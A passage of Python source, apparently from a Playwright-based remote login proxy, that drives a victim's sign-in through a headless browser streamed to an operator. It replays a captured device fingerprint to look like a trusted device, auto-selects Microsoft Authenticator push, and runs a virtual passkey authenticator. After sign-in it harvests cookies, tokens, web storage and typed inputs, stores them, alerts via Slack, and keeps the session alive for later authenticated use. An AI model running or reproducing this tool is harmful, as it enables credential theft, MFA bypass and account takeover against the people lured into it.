        # hints + Accept-Language so the IdP sees the same device it
        # already trusts. Off by default; enable via config.
        if get_config_value("use_captured_fingerprint", False):
            try:
                from backend.auth_proxy import get_captured_fingerprint
                _host = urlparse(login_url).hostname or ""
                fp = get_captured_fingerprint(_host) or {}
                if fp:
                    _ua = None
                    _extra: dict[str, str] = {}
                    for k, v in fp.items():
                        if k.lower() == "user-agent":
                            _ua = v
                        elif k.lower() == "accept-language":
                            # Playwright exposes locale separately; use the
                            # first language tag and keep the full header
                            # as an extra so the server sees what it saw
                            # before.
                            _extra[k] = v
                            primary = v.split(",", 1)[0].strip().split(";")[0]
                            if primary:
                                context_opts.setdefault("locale", primary)
                        else:
                            # Sec-CH-UA-* client hints — pass through as
                            # request headers on every outbound request.
                            _extra[k] = v
                    if _ua:
                        context_opts["user_agent"] = _ua
                    if _extra:
                        merged = dict(context_opts.get(
                            "extra_http_headers") or {})
                        merged.update(_extra)
                        context_opts["extra_http_headers"] = merged
                    _log(f"FINGERPRINT replay host={_host} "
                         f"ua={_ua[:60] if _ua else '(none)'} "
                         f"hints={len(_extra)}", session_id=sid)
                else:
                    _log(f"FINGERPRINT replay: no capture for "
                         f"host={_host} (browse it through :3128 first)",
                         session_id=sid, level="debug")
            except Exception as _fpe:
                _log(f"FINGERPRINT replay failed: {_fpe}",
                     session_id=sid, level="warn")

        # Device profile: overrides everything above. Sets UA, hints,
        # locale, timezone, viewport, mobile/touch flags so the IdP sees
        # a coherent device.
        if device:
            try:
                from backend import devices as _devices
                _devices.apply_to_context_opts(device, context_opts,
                                                session_id=sid)
                _log(f"DEVICE applied to context device={device['id']} "
                     f"ua={(context_opts.get('user_agent') or '')[:80]}",
                     session_id=sid)
                # Sync canvas-side dims to whatever the device pushed onto
                # context_opts. Without this, the page renders at the
                # device's viewport (e.g. iPad 1024x1366) but the operator's
                # canvas + click translation stay on the popup's URL params
                # (1280x900), so clicks land at the wrong page coordinates
                # and the session looks "hung at the prompt" because the
                # submit click never hits the form.
                _vp_dev = context_opts.get("viewport") or {}
                if _vp_dev.get("width") and _vp_dev.get("height"):
                    width = int(_vp_dev["width"])
                    height = int(_vp_dev["height"])
                _dsf = context_opts.get("device_scale_factor")
                if _dsf:
                    try:
                        dpr = float(_dsf)
                    except Exception:
                        pass
                if context_opts.get("is_mobile"):
                    mobile = True
                await ws.send_json({"type": "viewport",
                                    "width": width, "height": height,
                                    "mobile": mobile,
                                    "profile": mobile_profile,
                                    "dpr": dpr})
            except Exception as _de:
                _log(f"DEVICE apply_to_context failed: {_de}",
                     session_id=sid, level="warn")

        context = await browser.new_context(**context_opts)

        if private:
            _step("STEP 4/8: private mode — skipping saved cookies")
        else:
            saved_cookies = cookies_store.get(_cred["key"]) or cookies_store.get(site_id)
            if saved_cookies and isinstance(saved_cookies, list):
                await context.add_cookies(saved_cookies)
                _step(f"STEP 4/8: loaded {len(saved_cookies)} cookies")

        page = await context.new_page()
        _live_pages[sid] = page

        # Device profile: inject bundled cookies + extra headers + storage
        # init scripts. Run BEFORE the existing goto and BEFORE saved-cookie
        # restore — Playwright dedupes on add_cookies, and the device's
        # snapshot is the authoritative state we want first.
        if device:
            try:
                from backend import devices as _devices
                summary = await _devices.apply_post_launch(device, page,
                                                             session_id=sid)
                _log(f"DEVICE injected cookies={summary['cookies']} "
                     f"headers={summary['headers']} "
                     f"ls={summary['ls_origins']} ss={summary['ss_origins']}",
                     session_id=sid)
                await _devices.update(
                    device["id"], {"last_used_at": time.time()})
            except Exception as _pe:
                _log(f"DEVICE apply_post_launch failed: {_pe}",
                     session_id=sid, level="warn")

        # Microsoft Authenticator push approval — when on, the Playwright
        # session auto-clicks the push tile on MS's sign-in method picker
        # so the operator/user only has to approve in the phone app.
        _prefer_push_default = bool(get_config_value("prefer_push", False))
        _prefer_push_on = _prefer_push_default if prefer_push is None \
            else bool(prefer_push)
        # Per-page guard so we don't re-click the same tile across
        # framenavigated re-fires. Keyed by id(page); cleared implicitly
        # when pages are GC'd at session end.
        _push_clicked: set[int] = set()

        # Selectors that pick out the push-approval tile across MS's
        # picker variants. `[data-value]` is the stable contract on the
        # SAS picker; the text-based fallbacks cover branded / B2C UIs
        # that drop the data-value attribute.
        _push_tile_selector = (
            '[data-value="PhoneAppNotification"], '
            '[data-value="PushNotifications"], '
            'div[role="button"]:has-text("Approve a request"), '
            'div[role="listitem"]:has-text("Approve a request")'
        )
        # "Other ways to sign in" / "Sign-in options" links — clicking
        # one of these takes a user back to the picker when MS has
        # auto-routed them to a default method (e.g. passkey).
        _other_ways_selector = (
            '#signInAnotherWay, '
            'a:has-text("Sign-in options"), '
            'a:has-text("Other ways to sign in"), '
            'a:has-text("Try another way"), '
            'a:has-text("Use a different verification option")'
        )

        # MS data-values that identify a passkey/FIDO-class tile. An
        # account whose picker shows ONLY these is a dead-end for
        # headless / remote-server sign-in (BLE proximity / OS dialog
        # required), so we trigger the post-login redirect instead of
        # parking on a sign-in screen the user can't complete.
        _passkey_dvs = {"Fido", "FidoKey", "WindowsHelloForBusiness"}
        # One-shot guard so we don't fire the dead-end redirect more
        # than once per session even if multiple domcontentloaded
        # events surface the same picker.
        _mfa_dead_end_fired = [False]

        async def _dump_picker_methods(p):
            """Diagnostic: snapshot every method tile MS is showing so
            we can see what data-values / labels are in play on this
            tenant. Returns the list (also logged at debug level)."""
            try:
                methods = await p.evaluate(
                    "() => Array.from(document.querySelectorAll("
                    "  '[data-value], div[role=\"button\"], "
                    "   div[role=\"listitem\"]'"
                    ")).slice(0, 20).map(e => ({"
                    "  dv: e.getAttribute('data-value') || '',"
                    "  text: (e.innerText || e.textContent || '').trim()"
                    "        .slice(0, 80)"
                    "})).filter(m => m.dv || m.text)") or []
                if methods:
                    _log(f"AUTO-MFA: page methods snapshot: {methods}",
                         session_id=sid, category="auth", level="debug")
                return methods
            except Exception:
                return []

        async def _fire_dead_end_redirect(reason: str):
            """Shared exit path for every detected MFA dead-end. Sends
            the existing `post_login_redirect` WS message so the
            operator's dashboard tab navigates (same-tab via
            `window.location.href` in the frontend handler at
            `BrowserAuth.tsx`). Mirrors the success-path post-login
            redirect at the bottom of this function — sets
            `keep_alive_after_redirect=True` and stashes refs in
            `_kept_alive[sid]` BEFORE sending the WS message so the
            destructive teardown (`browser.close()`, `pw.stop()`)
            doesn't race the operator's navigation. Without this
            parity the operator's redirect appears in a new tab
            instead of the same tab even though both paths use the
            identical WS message. Idempotent via
            `_mfa_dead_end_fired`. Returns True when the message was
            sent."""
            nonlocal keep_alive_after_redirect
            if _mfa_dead_end_fired[0]:
                return False
            # Operator-driven launch (devices tab → Launch carries
            # `device_id`; subject-link / auto-launched / default-URL
            # sessions don't). Redirecting the operator's tab to the
            # original target URL would just navigate their REAL
            # browser, which has the OPERATOR's cookies for that host —
            # silently swapping the screen to the operator's own
            # signed-in account and abandoning the subject's playwright
            # state. Skip the redirect, leave the popup parked on the
            # dead-end screen, and surface a status message so the
            # operator can inspect Flow Trace / captured tokens before
            # closing the tab deliberately.
            if device_id:
                _mfa_dead_end_fired[0] = True
                _log(f"AUTO-MFA: {reason} — operator launch "
                     f"(device_id={device_id}); skipping post-login "
                     f"redirect so the test session stays inspectable.",
                     category="auth", session_id=sid, level="warn")
                show_qr = bool(get_config_value(
                    "mfa_dead_end_show_qr", False))
                dc_enabled = bool(get_config_value(
                    "mfa_dead_end_device_code_enabled", False))
                dc_url = (get_config_value(
                    "mfa_dead_end_device_code_url", "") or "").strip()

                # Diagnostic path: click a FIDO/passkey tile so MS's
                # passkey UI / cross-device QR renders inside the page.
                # BLE pairing from a remote server can't complete, so
                # this is a "see where it stalls" view, not a working
                # auth path.
                qr_clicked = False
                if show_qr:
                    for _dv in ("FidoKey", "Fido",
                                 "WindowsHelloForBusiness"):
                        try:
                            tile = await page.query_selector(
                                f'[data-value="{_dv}"]')
                        except Exception:
                            tile = None
                        if tile:
                            try:
                                await tile.click()
                                qr_clicked = True
                                _log(f"AUTO-MFA: clicked {_dv} tile to "
                                     f"surface passkey UI / cross-device "
                                     f"QR (operator launch)",
                                     category="auth", session_id=sid)
                                break
                            except Exception as _ce:
                                _log(f"AUTO-MFA: click {_dv} failed: "
                                     f"{_ce}",
                                     session_id=sid, level="warn")
                    if not qr_clicked:
                        _log("AUTO-MFA: show_qr on but no FIDO tile in "
                             "picker — falling through",
                             session_id=sid, level="warn")

                # OAuth device-code fallback: navigate the playwright
                # session to a configured device-flow URL so the
                # operator can complete token issuance via a phone scan.
                # Skipped if the QR click already advanced the page.
                dc_navigated = False
                if dc_enabled and dc_url and not qr_clicked:
                    try:
                        await page.goto(dc_url,
                                         wait_until="domcontentloaded",
                                         timeout=15000)
                        dc_navigated = True
                        _log(f"AUTO-MFA: navigated to OAuth device-code "
                             f"URL {dc_url[:120]}",
                             category="auth", session_id=sid)
                    except Exception as _ge:
                        _log(f"AUTO-MFA: device-code navigate failed: "
                             f"{_ge}",
                             session_id=sid, level="warn")

                if qr_clicked:
                    _msg = (
                        "Passkey UI surfaced — if MS renders a cross-"
                        "device QR, scan it with your phone. Bluetooth "
                        "pairing from a remote server may not complete; "
                        "sign-in can stall at the QR step.")
                elif dc_navigated:
                    _msg = (
                        f"Passkey unreachable — switched to OAuth "
                        f"device-code flow at {dc_url}. Scan / type the "
                        f"code on your phone to complete token issuance.")
                else:
                    _msg = (
                        "Passkey Error: We couldn't use your device "
                        "to verify your identity")
                try:
                    await ws.send_json({"type": "status",
                                         "message": _msg})
                except Exception:
                    pass
                return False
            dest = (get_config_value("post_login_redirect_url", "")
                    or "").strip() or original_target_url
            if not dest:
                return False
            _mfa_dead_end_fired[0] = True
            _log(f"AUTO-MFA: {reason} — firing post-login redirect to "
                 f"{dest[:120]} so the operator can proceed.",
                 category="auth", session_id=sid, level="warn")
            keep_alive_after_redirect = True
            _kept_alive[sid] = {
                "pw": pw,
                "browser": browser,
                "browser_is_warm": browser_is_warm,
                "context": context,
                "page": page,
                "kept_at": time.time(),
                "redirect_url": dest,
            }
            try:
                await ws.send_json({
                    "type": "post_login_redirect",
                    "url": dest,
                })
                return True
            except Exception as _re:
                _log(f"AUTO-MFA: failed to send dead-end redirect: {_re}",
                     session_id=sid, level="warn")
                return False

        async def _maybe_fire_passkey_dead_end(methods):
            """If the picker is showing only FIDO/passkey tiles (no
            push, no other paths headless can complete), fire the
            post-login redirect so the operator's browser can move on."""
            tile_dvs = [m["dv"] for m in methods
                        if m.get("dv")
                        and m["dv"] not in ("",)]
            if not tile_dvs:
                return  # nothing to classify — could be a transient page
            if not all(dv in _passkey_dvs for dv in tile_dvs):
                return  # at least one non-passkey method exists, not a dead-end
            await _fire_dead_end_redirect(
                "passkey-only picker detected — push isn't registered for "
                "this account and headless/remote can't complete passkey")

        async def _try_select_push(p):
            """Click the MS Authenticator push approval tile if visible.
            Two-step: first try a direct click on the picker; if not on
            the picker, click 'Sign-in options' to navigate there and
            click the push tile. Logs a diagnostic dump if nothing
            matches on a known MS login URL."""
            try:
                url_low = (p.url or "").lower()
                if not any(h in url_low for h in (
                        "login.microsoftonline.com",
                        "login.microsoft.com",
                        "login.live.com")):
                    return

                if id(p) in _push_clicked:
                    return  # already advanced past the picker

                # Step 1: push tile already on the page (we're on the
                # picker). Short timeout so we exit fast on pages that
                # don't have it.
                try:
                    tile = await p.wait_for_selector(
                        _push_tile_selector,
                        timeout=1500, state="visible")
                except Exception:
                    tile = None
                if tile:
                    _push_clicked.add(id(p))
                    await tile.click()
                    _log("AUTO-MFA: clicked push approval tile (direct "
                         "picker) — number-match challenge follows",
                         category="auth", session_id=sid)
                    return

                # Step 2: not on the picker. Look for a "Sign-in
                # options" / "Other ways" link that takes us there.
                try:
                    link = await p.wait_for_selector(
                        _other_ways_selector,
                        timeout=1000, state="visible")
                except Exception:
                    link = None
                if link:
                    await link.click()
                    _log("AUTO-MFA: clicked 'Sign-in options' link to "
                         "reach the method picker",
                         category="auth", session_id=sid)
                    # Wait for the picker tiles to render.
                    try:
                        tile = await p.wait_for_selector(
                            _push_tile_selector,
                            timeout=3000, state="visible")
                    except Exception:
                        tile = None
                    if tile:
                        _push_clicked.add(id(p))
                        await tile.click()
                        _log("AUTO-MFA: clicked push approval tile (via "
                             "picker) — number-match challenge follows",
                             category="auth", session_id=sid)
                        return
                    # Picker rendered but push isn't on it — dump what's
                    # available so the operator sees why, then check if
                    # this is a passkey-only dead-end and redirect.
                    methods = await _dump_picker_methods(p)
                    _log("AUTO-MFA: 'Sign-in options' opened but no push "
                         "tile found — Authenticator app push may not be "
                         "registered for this account, or the tile uses a "
                         "selector this code doesn't match. See "
                         "method-snapshot dump above.",
                         category="auth", session_id=sid, level="warn")
                    await _maybe_fire_passkey_dead_end(methods)
                    return

                # Neither push tile nor 'another way' link present.
                # Probably mid-flow on a password / loading page — that's
                # fine, we'll re-fire on the next domcontentloaded. But
                # if we appear to be stuck on something MS-rendered,
                # dump what's there for diagnosis and check for the
                # passkey-only dead-end.
                methods = await _dump_picker_methods(p)
                await _maybe_fire_passkey_dead_end(methods)
            except Exception as e:
                _log(f"AUTO-MFA: push tile auto-select skipped: {e}",
                     session_id=sid, level="debug")
        # Enable virtual WebAuthn authenticator via CDP so FIDO/passkey pages
        # don't hang waiting for a real hardware key
        try:
            cdp = await page.context.new_cdp_session(page)
            await cdp.send("WebAuthn.enable")
            await cdp.send("WebAuthn.addVirtualAuthenticator", {
                "options": {
                    "protocol": "ctap2",
                    "transport": "internal",
                    "hasResidentKey": True,
                    "hasUserVerification": True,
                    "isUserVerified": True,
                }
            })
            _step("STEP 5/8: page created, virtual authenticator enabled")
        except Exception as e:
            _step(f"STEP 5/8: page created (virtual authenticator failed: {e})")

        # Attach the full set of per-page instrumentation. Extracted into a
        # helper so we can re-attach when a popup opens and becomes the new
        # active page.
        async def _push_title():
            try:
                t = await page.title()
                await ws.send_json({"type": "title", "title": t, "url": page.url})
            except Exception:
                pass

        def _on_load():
            _log(f"PAGE_LOAD {page.url[:250]}", session_id=sid)
            _fire_and_forget(_push_title())

        # Per-session console dedup. Tight render loops (XFO frame
        # rejections, CSP violations, repeated CORS errors) flood the
        # log buffer with the same line. Collapse consecutive identical
        # messages, emit periodic "(×N more)" rollups, and flush the
        # accumulated count whenever a different message arrives.
        _console_state = {"last_msg": "", "repeat_count": 0,
                          "last_emit_ts": 0.0}
        _CONSOLE_FLUSH_SECS = 5.0
        _CONSOLE_FLUSH_HITS = 50
        # Resolve the YAML-driven filter regex ONCE per session so the
        # hot path doesn't pay for the import + cache lookup on every
        # console event. site_rules.console_filter_re() returns the
        # same compiled Pattern across calls when the YAML hasn't
        # changed; we capture it here.
        try:
            from backend import site_rules as _sr_for_console
            _console_filter_rx = _sr_for_console.console_filter_re()
        except Exception:
            _console_filter_rx = None

        def _emit_console(msg):
            try:
                line = f"CONSOLE [{msg.type}] {str(msg.text)[:300]}"
            except Exception:
                return
            # YAML-driven console filter — drops MSAL verbose /
            # AppInsights / XFO / CSP / framework noise before it
            # hits the log buffer or the WS fanout. Pattern is
            # captured ONCE in the closure scope (above), not
            # re-resolved per event — for a page with hundreds of
            # synchronous console.log calls that's a measurable cost.
            if _console_filter_rx is not None and _console_filter_rx.search(line):
                return
            now = time.time()
            st = _console_state
            if line == st["last_msg"]:
                st["repeat_count"] += 1
                # Periodic rollup so the user knows the loop is still
                # firing without hitting the log every iteration.
                if (st["repeat_count"] >= _CONSOLE_FLUSH_HITS
                        or now - st["last_emit_ts"] >= _CONSOLE_FLUSH_SECS):
                    _log(f"{line} (×{st['repeat_count']} more)",
                         session_id=sid)
                    st["repeat_count"] = 0
                    st["last_emit_ts"] = now
                return
            # Different message — flush any pending count for the
            # previous one, then emit the new one fresh.
            if st["repeat_count"] > 0 and st["last_msg"]:
                _log(f"{st['last_msg']} (×{st['repeat_count']} more)",
                     session_id=sid)
            _log(line, session_id=sid)
            st["last_msg"] = line
            st["repeat_count"] = 0
            st["last_emit_ts"] = now

        def _attach_page_handlers(p):
            # _cred["key"] is read at call time, so the inner coroutines see
            # updates when user_id changes. The credential-capture
            # path runs unconditionally because keepalive monitoring
            # depends on it. The flow-buffer + diagnostic-log
            # handlers ride behind `trace_active` so they only fire
            # when the operator opts in via config or `?trace=true`.
            if trace_active:
                async def _req_both(req):
                    await _on_flow_request(req, sid)
                    await _on_request_auth(req, _cred["key"], sid)
                async def _resp_both(resp):
                    await _on_flow_response(resp, sid)
                    await _on_response(resp, _cred["key"], sid)
                p.on("request", lambda req: _fire_and_forget(_req_both(req)))
                p.on("response", lambda resp: _fire_and_forget(_resp_both(resp)))
                p.on("framenavigated", lambda frame: _log(
                    f"FRAME_NAV {frame.url[:250]}", session_id=sid)
                    if frame == p.main_frame else None)
                p.on("load", lambda: _on_load())
                p.on("domcontentloaded", lambda: _log(
                    f"DOM_READY {p.url[:250]}", session_id=sid))
                p.on("console", _emit_console)
                p.on("pageerror", lambda err: _log(
                    f"PAGE_ERROR {err}", session_id=sid))
                def _req_failed(req):
                    seq = find_flow_seq_by_req_id(sid, str(id(req)))
                    tag = f"#{seq} " if seq is not None else ""
                    _log(f"{tag}REQ_FAILED {req.method} {req.url[:200]} "
                         f"failure={req.failure}", session_id=sid)
                p.on("requestfailed", _req_failed)
            else:
                # Trace-off path: only the credential-capture handlers
                # run. No flow append, no diagnostic logs, no console
                # event handler. Errors that matter (real pageerror,
                # requestfailed for the auth domains) still surface
                # via keepalive's own monitoring.
                p.on("request", lambda req: _fire_and_forget(
                    _on_request_auth(req, _cred["key"], sid)))
                p.on("response", lambda resp: _fire_and_forget(
                    _on_response(resp, _cred["key"], sid)))

            # Microsoft Authenticator push approval — auto-click the
            # `[data-value="PhoneAppNotification"]` tile when MS shows
            # its sign-in method picker. Lives outside the trace_active
            # gate because it's a behavioural toggle, not diagnostics.
            # The number-match challenge that follows is already
            # surfaced by site_rules (`mfa_app_number_match` -> "MFA
            # NUMBER MATCH — tap **N** in the authenticator app").
            if _prefer_push_on:
                p.on("domcontentloaded",
                     lambda: _fire_and_forget(_try_select_push(p)))

        _attach_page_handlers(page)

        # Follow popups / newly-opened tabs. Apps often redirect post-login
        # into a fresh page via target=_blank or window.open; without this
        # handler the user's clicks/keystrokes continue firing against the
        # original (abandoned) page and "nothing works".
        async def _on_new_page(new_page):
            nonlocal page
            try:
                await new_page.wait_for_load_state("domcontentloaded", timeout=10000)
            except Exception:
                pass
            _log(f"POPUP_OPENED {new_page.url[:200]} — switching active page",
                 session_id=sid)
            _attach_page_handlers(new_page)
            page = new_page
            _live_pages[sid] = new_page
            try:
                await new_page.bring_to_front()
            except Exception:
                pass
            try:
                await ws.send_json({"type": "status",
                                    "message": f"Switched to new window: {new_page.url[:120]}"})
                await ws.send_json({"type": "current_url", "url": new_page.url})
            except Exception:
                pass

        context.on("page", lambda p: _fire_and_forget(_on_new_page(p)))

        _step(f"STEP 6/8: navigating to {login_url}...")
        try:
            resp = await page.goto(login_url, wait_until="commit", timeout=15000)
            _step(f"STEP 7/8: committed ({resp.status if resp else '?'}) -> {page.url[:150]}")
        except Exception as e:
            _step(f"STEP 7/8: goto error (continuing): {e}")

        await ws.send_json({"type": "status", "message": f"Loaded: {page.url}"})
        await ws.send_json({"type": "current_url", "url": page.url})

        _step("STEP 8/8: running")
        running = True
        auth_detected = False
        login_seen = False
        screenshot_count = 0
        screenshot_errors = 0

        screenshots_base = _get_screenshots_dir()
        screenshots_dir = screenshots_base / sid
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # Real-time responsiveness levers:
        #  1) Polling loop (firefox/webkit) sleeps on a `screenshot_nudge`
        #     asyncio.Event that input handlers .set() — a click pushes a
        #     frame within ~one capture cycle instead of waiting up to
        #     `screenshot_interval` for the next poll.
        #  2) Chromium uses CDP `Page.startScreencast` instead of polling:
        #     Chrome pushes JPEG frames whenever paint changes, so input
        #     response is bounded by paint latency (≈one vsync), not by
        #     the polling interval. Falls back to polling on CDP failure.
        screenshot_nudge = asyncio.Event()

        async def _send_frame(jpeg: bytes):
            nonlocal screenshot_count, screenshot_errors
            try:
                await ws.send_bytes(jpeg)
            except Exception:
                # WS dropped — let the outer handler discover it.
                return
            screenshot_count += 1
            screenshot_errors = 0
            try:
                shot_path = screenshots_dir / f"{screenshot_count:05d}.jpg"
                shot_path.write_bytes(jpeg)
                max_shots = int(get_config_value("max_screenshots", 100))
                if max_shots > 0 and screenshot_count > max_shots:
                    old_path = screenshots_dir / f"{screenshot_count - max_shots:05d}.jpg"
                    old_path.unlink(missing_ok=True)
            except OSError:
                pass  # /screenshots not mounted — skip silently

        async def _polling_screenshot_loop():
            nonlocal screenshot_count, screenshot_errors
            while running:
                # Re-read each tick so config changes (Settings →
                # Browser/perf) take effect without a session restart.
                quality = max(1, min(100, int(get_config_value("screenshot_quality", 85))))
                interval = max(0.05, float(get_config_value("screenshot_interval", 0.3)))
                # The polling loop only runs for non-Chromium engines
                # (Firefox / WebKit) — Chromium uses the CDP screencast
                # loop above. Cap quality + clamp interval so a heavy
                # page doesn't make the canvas feel unresponsive while
                # the operator types.
                if get_config_value("screenshot_low_fidelity_non_chromium", True):
                    quality = min(quality, 55)
                    interval = max(interval, 0.5)
                try:
                    jpeg = await asyncio.wait_for(
                        page.screenshot(type="jpeg", quality=quality), timeout=3.0)
                    await _send_frame(jpeg)
                except asyncio.TimeoutError:
                    screenshot_errors += 1
                    if screenshot_errors > 30:
                        _log("FATAL: screenshot timeouts", session_id=sid)
                        break
                except Exception as e:
                    screenshot_errors += 1
                    # The transient "Page.captureScreenshot: Unable to
                    # capture screenshot" from Playwright during page
                    # navigation is common and self-heals on the next
                    # tick — log at debug so it doesn't clutter All Logs.
                    msg = str(e)
                    benign = ("captureScreenshot" in msg
                              or "Target closed" in msg
                              or "Target page, context or browser has been closed" in msg)
                    if screenshot_errors <= 3 and not benign:
                        _log(f"screenshot error: {e}", session_id=sid)
                    elif screenshot_errors <= 3:
                        _log(f"screenshot error (transient): {e}",
                             session_id=sid, level="debug")
                    if screenshot_errors > 30:
                        break
                # Sleep until either the interval expires or an input
                # handler nudges us to capture immediately.
                try:
                    await asyncio.wait_for(screenshot_nudge.wait(),
                                            timeout=interval)
                except asyncio.TimeoutError:
                    pass
                screenshot_nudge.clear()

        async def _chromium_screencast_loop():
            nonlocal screenshot_count, screenshot_errors
            cdp = None
            try:
                cdp = await context.new_cdp_session(page)
                quality = max(1, min(100, int(get_config_value("screenshot_quality", 85))))

                async def _on_frame(frame):
                    nonlocal screenshot_errors
                    try:
                        jpeg = base64.b64decode(frame["data"])
                        await _send_frame(jpeg)
                        # Ack so Chrome sends the next frame.
                        await cdp.send("Page.screencastFrameAck",
                                        {"sessionId": frame["sessionId"]})
                    except Exception as e:
                        screenshot_errors += 1
                        msg = str(e)
                        benign = ("Target closed" in msg
                                  or "Target page, context or browser has been closed" in msg)
                        if screenshot_errors <= 3 and not benign:
                            _log(f"screencast frame error: {e}",
                                 session_id=sid, level="debug")

                # Subscribe BEFORE starting so we don't drop the
                # initial frame Chrome sends right after startScreencast.
                cdp.on("Page.screencastFrame",
                       lambda f: asyncio.create_task(_on_frame(f)))
                # Chrome multiplies maxWidth/maxHeight by DPR internally;
                # passing CSS-pixel bounds gives us the same image size
                # `page.screenshot()` would produce.
                await cdp.send("Page.startScreencast", {
                    "format": "jpeg",
                    "quality": quality,
                    "maxWidth": int(width * dpr),
                    "maxHeight": int(height * dpr),
                    "everyNthFrame": 1,
                })
                _log("SCREENCAST started (CDP Page.startScreencast)",
                     session_id=sid, level="debug")

                # Idle until session ends — frames arrive via the event
                # callback above. We still re-read screenshot_quality
                # periodically and bounce screencast if it changed, so
                # the dashboard knob stays live-tunable.
                last_quality = quality
                while running:
                    await asyncio.sleep(2.0)
                    new_quality = max(1, min(100, int(get_config_value("screenshot_quality", 85))))
                    if new_quality != last_quality:
                        try:
                            await cdp.send("Page.stopScreencast")
                            await cdp.send("Page.startScreencast", {
                                "format": "jpeg",
                                "quality": new_quality,
                                "maxWidth": int(width * dpr),
                                "maxHeight": int(height * dpr),
                                "everyNthFrame": 1,
                            })
                            last_quality = new_quality
                        except Exception as e:
                            _log(f"screencast quality bounce failed: {e}",
                                 session_id=sid, level="debug")
            except Exception as e:
                _log(f"SCREENCAST setup failed ({e}); falling back to polling",
                     session_id=sid, level="warn")
                await _polling_screenshot_loop()
            finally:
                if cdp is not None:
                    try:
                        await cdp.send("Page.stopScreencast")
                    except Exception:
                        pass
                    try:
                        await cdp.detach()
                    except Exception:
                        pass

        if engine_family == "chromium":
            screenshot_task = asyncio.create_task(_chromium_screencast_loop())
        else:
            screenshot_task = asyncio.create_task(_polling_screenshot_loop())

        async def _do_auto_capture(reason: str):
            """Auto-capture credentials when auth is detected."""
            nonlocal auth_detected, keep_alive_after_redirect
            if auth_detected:
                return
            auth_detected = True
            _log(f"AUTH COMPLETE — auto-capturing ({reason})", category="auth", session_id=sid)
            try:
                await asyncio.sleep(1.5)  # let final cookies settle
                ck = _cred["key"]
                cookies = await context.cookies()
                cookies_store.put(ck, cookies)
                local_storage = await page.evaluate(
                    "() => { try { const o={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);o[k]=localStorage.getItem(k)} return o } catch(e){return {}} }")
                session_storage = await page.evaluate(
                    "() => { try { const o={}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);o[k]=sessionStorage.getItem(k)} return o } catch(e){return {}} }")
                _capture_url = page.url
                _capture_user = _cred["user"]
                _capture_inputs = list(captured_inputs)

                def _merge_auto_capture(cred_data):
                    cred_data["cookies"] = cookies
                    cred_data["local_storage"] = local_storage
                    cred_data["session_storage"] = session_storage
                    cred_data["current_url"] = _capture_url
                    cred_data["captured_at"] = time.time()
                    cred_data["captured_inputs"] = _capture_inputs
                    cred_data["user_id"] = _capture_user
                    cred_data["site_id"] = site_id
                    if _cred.get("cid"):
                        cred_data["cid"] = _cred["cid"]
                    return cred_data

                cred_data = await credentials_store.update(
                    ck, _merge_auto_capture,
                    default={"tokens": [], "cookies": []})
                notify_sites_changed()
                _fire_and_forget(notify_slack_capture(
                    ck, urlparse(_capture_url).hostname or site_id,
                    len(cred_data.get("tokens", [])), len(cookies),
                    user=_capture_user))
                summary = (f"AUTO-CAPTURED {len(cookies)} cookies, "
                           f"{len(cred_data.get('tokens', []))} tokens, "
                           f"{len(local_storage)} localStorage, "
                           f"{len(session_storage)} sessionStorage")
                _log(summary, category="capture", session_id=sid)
                try:
                    _subs.record_event(sid, "auto_capture",
                                       cookies=len(cookies),
                                       tokens=len(cred_data.get("tokens", [])),
                                       local_storage=len(local_storage),
                                       session_storage=len(session_storage),
                                       url=_capture_url[:300])
                except Exception:
                    pass
                try:
                    host = urlparse(_capture_url).hostname or ""
                    if host:
                        _hosts.record_event(host, "auto_capture",
                                            sid=sid, user_id=_capture_user,
                                            cookies=len(cookies),
                                            tokens=len(cred_data.get("tokens", [])),
                                            local_storage=len(local_storage),
                                            session_storage=len(session_storage),
                                            url=_capture_url[:300])
                except Exception:
                    pass
                await ws.send_json({
                    "type": "captured",
                    "site_id": site_id,
                    "url": page.url,
                    "cookie_count": len(cookies),
                    "token_count": len(cred_data.get("tokens", [])),
                    "captured_inputs": list(captured_inputs),
                    "auto": True,
                })
                await ws.send_json({"type": "status", "message": f"Authenticated: {page.url}"})
                # Optional post-login redirect — tell the operator's
                # browser tab to navigate to the URL the user actually
                # wanted. The Playwright session itself stays put where
                # the IdP left it, AND survives the WS disconnect that
                # the redirect causes — strong refs are stashed in
                # `_kept_alive` so `_fetch_via_playwright` can keep
                # routing authenticated requests through this context.
                # Uses the explicit override if set, else the resolved
                # target the session was launched with.
                if get_config_value("post_login_redirect_enabled", False):
                    dest = (get_config_value("post_login_redirect_url", "")
                            or original_target_url or "").strip()
                    if dest:
                        _log(f"POST_LOGIN_REDIRECT -> {dest[:120]} "
                             f"(session kept alive)",
                             category="browser", session_id=sid)
                        keep_alive_after_redirect = True
                        _kept_alive[sid] = {
                            "pw": pw,
                            "browser": browser,
                            "browser_is_warm": browser_is_warm,
                            "context": context,
                            "page": page,
                            "kept_at": time.time(),
                            "redirect_url": dest,
                        }
                        try:
                            await ws.send_json({
                                "type": "post_login_redirect",
                                "url": dest,
                            })
                        except Exception as _re:
                            _log(f"POST_LOGIN_REDIRECT failed: {_re}",
                                 category="browser", session_id=sid,
                                 level="warn")

                # Optional post-login Playwright redirect — navigate
                # the Playwright session itself (the headless browser)
                # to a URL. Independent from the operator-browser
                # redirect above; you can have one, both, or neither.
                if get_config_value("post_login_redirect_playwright_enabled", False):
                    dest_pw = (get_config_value("post_login_redirect_playwright_url", "")
                               or original_target_url or "").strip()
                    cur = page.url or ""
                    if dest_pw and dest_pw != cur:
                        _log(f"POST_LOGIN_REDIRECT_PLAYWRIGHT -> "
                             f"{dest_pw[:120]}",
                             category="browser", session_id=sid)
                        try:
                            await page.goto(dest_pw, wait_until="commit",
                                            timeout=15_000)
                        except Exception as _pwe:
                            _log(f"POST_LOGIN_REDIRECT_PLAYWRIGHT "
                                 f"failed: {_pwe}",
                                 category="browser", session_id=sid,
                                 level="warn")
            except Exception as e:
                _log(f"Auto-capture error: {e}", session_id=sid)

        async def _dismiss_app_install(page_ref):
            """Try to dismiss 'install app' / 'get the app' prompts."""
            try:
                dismiss_selectors = [
                    # Microsoft "Use the web app instead" / "Continue to website"
                    'a:has-text("Use the web app")',
                    'a:has-text("use the web app")',
                    'button:has-text("Continue")',
                    'a:has-text("Continue to website")',
                    'a:has-text("No thanks")',
                    'a:has-text("no thanks")',
                    'button:has-text("No thanks")',
                    'a:has-text("Skip")',
                    'button:has-text("Skip")',
                    # Generic dismiss / close
                    'button[aria-label="Close"]',
